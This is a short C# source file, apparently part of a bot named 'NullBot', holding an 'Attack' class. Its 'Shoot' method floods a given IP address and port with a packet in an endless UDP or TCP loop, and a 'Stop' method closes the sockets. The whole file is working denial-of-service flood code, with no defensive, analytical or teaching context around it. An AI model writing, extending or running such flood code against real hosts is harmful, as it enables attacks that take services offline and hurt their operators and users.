using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace NullBot
{
    class Attack
    {
        private Socket tcp;
        private Socket udp;
        private static bool connect = false;

        public void Shoot(string ip, int port, byte[] packet, String method)
        {
            try
            {
                IPEndPoint ipep = new IPEndPoint(IPAddress.Parse(ip), port);

                tcp = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                udp = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

                if (method == "UDP" || method == "Udp" || method == "udp")
                {
                    while (true)
                    {
                        udp.SendTo(packet, ipep);
                        connect = true;
                    }
                }

                else if (method == "TCP" || method == "Tcp" || method == "tcp")
                {
                    tcp.Connect(ipep);

                    while (true)
                    {
                        tcp.Send(packet, SocketFlags.None);
                        connect = true;
                    }
                }
            }

            catch { }
        }

        public void Stop()
        {
            if (connect == true)
            {
                udp.Close();
                tcp.Close();
            }
        }
    }
}